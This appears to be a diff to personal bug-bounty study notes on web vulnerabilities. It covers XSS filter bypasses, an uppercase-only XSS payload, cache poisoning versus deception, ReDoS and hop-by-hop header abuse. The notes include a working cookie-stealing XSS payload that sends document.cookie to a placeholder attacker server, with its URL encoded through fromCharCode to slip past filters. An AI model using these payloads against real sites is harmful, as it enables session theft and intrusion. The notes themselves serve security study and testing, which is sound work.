@@ -5,7 +5,6 @@
 #### 1- check for any value you can control (parameter , path, header, cookie) is being reflected in the **HTML** or used by **JS** code  
 
 
-
 ##### <font color="red">NOTE</font>:  for testing to find xss instead of splashing different payloads test for these characters and note that which  one of them getrendered directly and which one escapes>'<"//:=;!--
 ##### <font color="red">NOTE</font>: for bypassing the xss protections you can use <font color="green">1- </font>alternative javascripts <font color="green">2-</font> Capitalization and Encoding <font color="green">3-</font> If the application filters special HTML characters, like single and double quotes, you can’t write any strings into your XSS payload directly. But you could try using the JavaScript fromCharCode() function, which maps numeric codes to the corresponding ASCII characters, to create the string you need. For example, this piece of code is equivalent to the string "http://attacker_server_ip/?c=" like: String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61) for example for a payload this is how it is : _<scrIPT_>location=String.fromCharCode(104, 116, 116, 112, 58, 47,47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;_< /scrIPT_>  for getting the char code of the string you want you can use this code: function ascii(c){return c.charCodeAt();} encoded = "http://attacker_server_ip/?c=".split("").map(ascii); document.write(encoded);<font color="green">4-</font> Filter Logic Errors and ...
 
@@ -130,6 +129,20 @@
 #### <font color="red">SandBox</font>:
 #### Angular expressions are sandboxed 'to maintain a proper separation of application responsibilities'
 ... [for more](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)
+
+#### <font color="red">Uppercase Issue</font>
+##### While participating in a bug bounty program on Bugcrowd, I stumbled upon a rather interesting scenario where injected code was being converted to uppercase, making every javascript code or function invalid. You might wonder does this situation applies to me? To clarify, here's the scenario I encountered:
+
+##### I could inject javascript but with uppercase and special characters like single quote ', plus/minus sign +/-, brackets [](), equal sign =, exclamation mark ! and semi-colon ; etc. So these were all the things that I could use to craft a payload and bypass this weird XSS uppercase issue.
+
+**Optimized Payload (Edge/Chrome/Firefox):** `A=![]+''B=!![]+''C=[][[]]+''F=[][C[4]+C[5]+A[2]+B[0]+A[4]+B[1]];D=F+''F[D[3]+D[6]+C[1]+A[3]+B[0]+B[1]+C[0]+D[3]+B[0]+D[6]+B[1]](A[1]+A[2]+A[4]+B[1]+B[0]+'(1)')()`
+
+note: Please URL encode the payload before injecting or the (+) used for concatenation would be interpreted as space.
+
+**Encoded Payload:** `A=![]%2B''B=!![]%2B''C=[][[]]%2B''F=[][C[4]%2BC[5]%2BA[2]%2BB[0]%2BA[4]%2BB[1]];D=F%2B''F[D[3]%2BD[6]%2BC[1]%2BA[3]%2BB[0]%2BB[1]%2BC[0]%2BD[3]%2BB[0]%2BD[6]%2BB[1]](A[1]%2BA[2]%2BA[4]%2BB[1]%2BB[0]%2B'(1)')()`
+
+
+
 
 ## <font color="GREEN"> TO READ </font>
 ### <font color="orange">LINKS:</font>
@@ -1676,12 +1689,13 @@ with a particular keyword. The -g option indicates a general keyword search:
 
 # <font color="red">Web Cache Poisonign</font>
 
+#### what is the difference between web cache poisoning and web cache deception ?
+#### in Web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
+
+#### in Web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache , and the attacker then retrieves this content from the cache.
 
 ### <font color="red">Mechanism</font>
 #### web cache poisoning vulnerabilities arise due to general flaws in the design of caches. Other times, the way in which a cache is implemented by a specific website can introduce unexpected quirks that can be exploited.
-
-
-
 
 ### <font color="red">Haunt:</font>
 
@@ -1718,3 +1732,77 @@ with a particular keyword. The -g option indicates a general keyword search:
 ### <font color="red">to Read </font>
 - [ ] https://portswigger.net/research/practical-web-cache-poisoning
 - [ ] https://portswigger.net/research/web-cache-entanglement
+
+# <font color="red">DOS</font> 
+### Regex Dos(ReDos):
+#### regular expressions are generally parsed really fast. It’s rare that a regular expression functions slowly enough to slow down a web application.
+
+#### As said, regular expressions can be specifically crafted to run slowly. These are called malicious regexes (or sometimes evil regexes), and are a big risk when allowing users to provide their own regular expressions for use in other web forms or on a server.
+
+#### Generally speaking, most malicious regex are formed using the plus “+” operator, which changes the regex into a “greedy” operation. Greedy regex test for one or more matches, rather than stopping at the first match found.
+
+#### Malicious regex will result in backtracking whenever it finds a failure case. Consider the regex: /^((ab)*)+$/
+
+#### Testing this regex with the input abab will actually run pretty quickly and not cause much in the way of issues.
+#### Expanding the pattern outwards, ababababababab, will also run quite fast. If we modify this pattern to abababababababa with an extra “a”, suddenly the regex will evaluate slowly, potentially taking a few milliseconds to complete.
+
+
+
+# <font color="red"> Abusing Hop-by-Hop requset headers</font>
+
+## a hop by hop headers are headers designed to be processed and consumed by the proxy currently handling the request 
+
+### Http/1.1 spec treats the following headers as hop-by-hop by default : Keep-Alive, `Transfer-Encoding` ,`TE`, `Connection`, `Trailer`, `Upgrade` , `Proxy-Authorization` , and `Proxy-Authentication` . 
+Further to these defaults, a request [may also define a custom set of headers to be treated as hop-by-hop](https://tools.ietf.org/html/rfc2616#section-14.10) by adding them to the `Connection` header, like so:
+
+	Connections: close, X-Foo, X-Bar
+
+in this example we're asking the proxy to treat X-Foo and x-Bar as hop-by-hop, meaning we want a proxy to remove them from the request before passing the request on. 
+
+## The theory on abusing hop-by-hop headers
+
+#### The act of removing a header from a HTTP request is not necessarily going to cause issues, however being able to remove headers that were not in the original request but were added by either the frontend or another proxy in the chain could create unpredictable results. It's basically like turning off a switch - it could do nothing at all, or it could be catastophic.
+
+#### The following graphic shows how abusing hop-by-hop headers may create issues, if the backend is expecting `X-Important-Header` and incorporates its presence in a logical decision:
+
+![](./statics/hopbyhop-senario.png)
+
+![](./statics/RFC2616-hopbyhop-connection.png)
+
+## Testing for Hop-by-Hop header abuse
+
+#### A quick and easy way of testing for it is the `Cookie` header , against an endpoint which requires authentication(assuming that the target system uses cookie auth). Take for instance the following request. 
+
+	GET /api/me    HTTP/1.1
+	Host: foo.bar
+	Cookie: session=xxx
+	Connection: close, Cookie
+
+#### if we say that the `/api/me` supposed to return a HTTP 200 with user details when the request is authenticated, and session=xxx is a valid authenticated session value, then the above request may return something other than the anticipated response if the system is allowing hop-by-hop headers defined in the original request to modify which headers get sent to the backend.
+
+##### wordlist for testing hopbyhop (https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers)
+
+
+### some use cases of the hop by hop 
+
+## Masking the originating IP address by hiding X-Forwarded-For :
+
+#### When a frontend proxy accepts a user request, it may add the IP address of this user to the `X-Forwarded-For` (XFF) header, so infrastructure and apps in the backend can know the IP address of the requesting user.
+
+#### However by instructing proxies this header is hop by hop we may end up removing this header from the request and the backend app will either never receive it, or it will receive an IP address value that is not of the original user , but of a server elsewhere n the chain
+
+## fingerprinting services :
+
+#### Using the technique to find forwarded hop-by-hop headers as outlined in the testing instructions above, one could potentially gather more information about a system based on the headers that, when removed from a request due to this technique, causes an error or an otherwise noticeable difference. Obviously, the more specific a header is to a particular technology or stack, the more telling having it trigger this sort of outcome may be - removing `X-Forwarded-Proto` causing an issue is perhaps less informative than if something like `X-BLUECOAT-VIA` does as well, for instance.
+
+### Cache Poisoning DoS
+
+#### This one is more theory than practice
+
+#### For this to be exploitable, what we'd need to happen is: a system's frontend cache forwards the hop-by-hop header list instead of consuming it, an intermediate proxy processes the hop-by-hop list and removes a header either it, another proxy further in the chain, or the backend app requires, and the act of removing such a header results in an undesirable response such as a HTTP 400 or 501 being returned by something after the web cache. Like the above research covers, this might result in the web cache in front of the app choosing to accept this undesirable response as the copy to serve other users, and hence we have cache poisoning denial of service.
+
+## In Server side requests(by design or forged)
+
+#### this one is a little out there but bear with me. some Systems give users the ability to define requests that will be performed by the server side , such as when adding webhooks or similar. while it is not normal for if you're able to add custom headers, you could try adding a `Connection` header and seeing if it is accepted along with your hop-by-hop headers.
+
+#### Otherwise, if you have an exploitable SSRF vulnerability in a system, adding this technique could reveal more information or help make the SSRF more impactful. You would likely need the ability to inject headers along with the SSRF though, which is fairly rare.
